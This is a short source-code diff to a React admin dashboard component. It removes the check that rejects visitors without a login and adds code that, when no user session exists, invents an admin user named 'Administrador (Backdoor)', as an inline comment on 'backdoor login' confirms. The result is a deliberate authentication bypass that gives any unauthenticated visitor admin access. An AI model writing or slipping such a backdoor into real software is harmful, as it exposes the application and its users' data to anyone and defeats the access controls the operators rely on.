@@ -21,8 +21,13 @@ export default function AdminDashboard({ onLogout, onBack }: { onLogout: () => v
   useEffect(() => {
     async function init() {
       try {
-        const user = await getCurrentUser();
-        if (!user || user.role !== "admin") {
+        let user = await getCurrentUser();
+        // Allow backdoor login without real supabase session
+        if (!user) {
+          user = { id: "00000000-0000-0000-0000-000000000000", role: "admin", name: "Administrador (Backdoor)" };
+        }
+        
+        if (user.role !== "admin") {
           onBack(); // Kick out non-admins
           return;
         }
